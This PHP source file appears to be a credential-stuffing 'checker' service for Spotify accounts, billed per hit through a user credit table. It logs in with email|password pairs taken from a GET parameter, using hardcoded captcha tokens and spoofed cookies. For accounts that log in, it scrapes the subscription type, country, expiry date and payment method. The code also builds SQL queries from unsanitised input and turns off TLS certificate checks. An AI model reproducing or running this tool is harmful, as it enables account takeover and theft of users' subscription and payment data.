<?php
require '../includes/config.php';
function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
                    $query = "SELECT * FROM user WHERE username='$username_trial'";
                    $exe = mysqli_query($connection,$query);
                    $no = 1;
                    while($row = mysqli_fetch_assoc($exe)){
                        $credit = $row['credit']; 
                        
                    }

if ($credit < 5) {
echo '{"error":8888,"msg":"Minimum Credits Is 20"}';
exit;
}
function in_string($s,$as) {
	$s=strtoupper($s);
	if(!is_array($as)) $as=array($as);
	for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
	return false;
}
        $ch = curl_init('https://accounts.spotify.com/it-IT/login');
        $headers = array();
        $headers[] = "Accept-Encoding: gzip, deflate, gzip, br";
        $headers[] = "Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4";
        $headers[] = "Upgrade-Insecure-Requests: 1";
        $headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Mobile Safari/537.36";
        $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
        $headers[] = "Cache-Control: max-age=0";
        $headers[] = "Connection: keep-alive";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        $result = curl_exec($ch);
        preg_match('/^Set-Cookie:\s*([^;]*)/mi', $result, $m);
        parse_str($m[1], $cookies);
        $token = $cookies['csrf_token'];
        $captcha = "03AHqfIOm4j3-D0aqjMcEVTG4rxPW45cVz_6nyuzVsuyV8VOSUpOJdYPTJuvU96rSB3AcZMoUQRYQu57jsGW2eBRqYS0qUDRt_zJ8zbzy-XbLtWPHkOOQ9TsoMLPSkvrl2HSmFlQ9k-W7MpEPjrWQ8sNsuqvdnzIuGKXpN2KssOsZtxnfieRdOUBx5xtUS6SWKuR9pgEJxWgEBw8jbR09SS7g3CZi4oHMnGzIIEbZFGdlczWjEpwcH0CEYsje2a3JySWwteNHG1EAA625ydavEltVY2eYo2QFRPO_gOd6AtmMj4b_1_suPGiAfMxH_6CntfJWrZce0dlCZ-CqX31rFbd1aqnXRhNcTSmclJG7fxKkrKq4nApeAHM3Q8ogEPeuCA-IxqiF3apznpBGlikrzCUhQxudykOdN_UNhSRWejapt5KblK44BGfY";
        $bon_cookie = base64_encode("0|0|0|0|1|1|1|1");
        
        $empass = $_GET['empass'];
        $pisah = explode("|", $empass);
        $email = $pisah[0];
        $pass = $pisah[1];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/api/login");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "remember=true&username=$email&password=$pass&captcha_token=03AHqfIOkwnrjJn7mvB00OuKdL8TjaGgKcKqQFmKbkuwjfczRf2MAS8XPZZP0xnw5AVBHbtkMgotKsHIoynlYC1D_7E5tC2rtjldFAlV98mMyuG-Dq9BmWLeAdX25PZnN1YfojNxJIKMPQCLv_jDzG6pToek4f_USpmhG5801DzBvgmIfRbLvEuSdMlN9odsdyGSR7R_ZGsQKVyzBEu-5727ADo2JPW27kpIzS678pEgfUX6XQJ77RdeaxMDGFypUuExshFqH0vX3_C31OjQgMXTnuE11Pgx_Kktpy-cDcnsFYWSRY_UOimgw&csrf_token=$token");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        $headers = array();
        $headers[] = "Origin: https://accounts.spotify.com";
        $headers[] = "Accept-Encoding: gzip, deflate, br";
        $headers[] = "Accept-Language: en,id;q=0.9,en-US;q=0.8,id-ID;q=0.7";
        $headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Mobile Safari/537.36";
        $headers[] = "Content-Type: application/x-www-form-urlencoded";
        $headers[] = "Accept: application/json, text/plain, */*";
        $headers[] = "Referer: https://accounts.spotify.com/it-IT/login";
        $headers[] = "Cookie: sp_t=888015720f0f66456aa84cedb8efc658; sp_new=1; sp_ab=%7B%222018_08_student_promotion%22%3A%22student_promotion%22%7D; _ga=GA1.2.1653574255.1535904547; _gid=GA1.2.202277216.1535904547; remember=camillabasse%40gmail.com; sp_usid=46408621-9d56-4120-99a5-427877013130; spot=%7B%22t%22%3A1535907787%2C%22m%22%3A%22id%22%2C%22p%22%3A%22premium%22%7D; __bon=$bon_cookie; csrf_token=$token; fb_continue=https%3A%2F%2Faccounts.spotify.com%2Fit-IT%2Fstatus; _gat=1";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result1 = curl_exec($ch);
        // BATAS

        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $header = substr($result1, 0, $header_size);
        $body = substr($result1, $header_size);
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result1, $matches);
        $cookies = array();
        foreach ($matches[1] as $item) {
            parse_str($item, $cookie);
            $cookies = array_merge($cookies, $cookie);
        }
        $output['body'] = $body;
        $output['cookies'] = $cookies;
        $auth = $output;
        $json_response = $auth['body'];
        $array_response = json_decode($json_response, true);
        error_reporting(0);
        $error = $array_response['error'];
        $display_name = $array_response['displayName'];
        if ($error != null) {
            $output_check['status'] = "fail";
            $output_check['error'] = $error;
        } else if ($display_name != null) {
            $output_check['status'] = "success";
            $cookies = $auth['cookies'];
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://www.spotify.com/id/account/overview/");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
            $cookie = $cookies['sp_dc'];
            $headers = array();
            $headers[] = "Accept-Encoding: gzip, deflate, gzip, br";
            $headers[] = "Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4";
            $headers[] = "Upgrade-Insecure-Requests: 1";
            $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36";
            $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
            $headers[] = "Cookie: sp_ftv=1; sp_landing=www.spotify.com^%^2F; sp_landing_15d=www.spotify.com^%^2F; sp_landing_30d=www.spotify.com^%^2F; sp_new=1; sp_ab=; pxt=; justRegistered=null; _gat=1; sp_dc=$cookie";
            $headers[] = "Connection: keep-alive";
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://www.spotify.com/id/account/subscription/");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
            curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
            $cookie = $cookies['sp_dc'];
            $headers = array();
            $headers[] = "Accept-Encoding: gzip, deflate, gzip, br";
            $headers[] = "Accept-Language: it-IT,it;q=0.8,en-US;q=0.6,en;q=0.4";
            $headers[] = "Upgrade-Insecure-Requests: 1";
            $headers[] = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36";
            $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
            $headers[] = "Cookie: sp_ftv=1; sp_landing=www.spotify.com^%^2F; sp_landing_15d=www.spotify.com^%^2F; sp_landing_30d=www.spotify.com^%^2F; sp_new=1; sp_ab=; pxt=; justRegistered=null; _gat=1; sp_dc=$cookie";
            $headers[] = "Connection: keep-alive";
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result2 = curl_exec($ch);
            
            $country = getStr($result,'<p class="form-control-static" id="card-profile-country">',"</p>");
            $exp = getStr($result2,'<b class="recurring-date">',"</b>");
            $payments = getStr($result2,'<div class="payment-details-name" title="','"');
            if($payments == null){
                $payment = "null";
            } else {
                $payment = $payments;
            }

            if (in_string($result,'<h3 class="product-name">Premium for Family</h3>')) {
                $output_check['empass'] = $email."|".$pass;
                $output_check['subscription'] = "Premium For Family ";
                $output_check['country'] = $country;
                $output_check['expdate'] = $exp;
                $output_check['payment'] = $payment;
                mysqli_query($connection,"UPDATE user SET credit=credit-1 WHERE username='$username_trial'");
            } else if(in_string($result, '<h3 class="product-name"><span class="icon-checkmark-wrap"><svg><use xlink:href="#icon-checkmark"></use></svg></span>Spotify Premium</h3>')) {
                $output_check['empass'] = $email."|".$pass;
                $output_check['subscription'] = "Premium";
                $output_check['country'] = $country;
                $output_check['payment'] = $payment;
                $output_check['expdate'] = $exp;
                mysqli_query($connection,"UPDATE user SET credit=credit-1 WHERE username='$username_trial'");
            } else {
                $output_check['subscription'] = "Free";
                $output_check['country'] = $country;
            }
        }
        $output_json = json_encode($output_check);
        echo $output_json;
//echo $result2;
        ?>
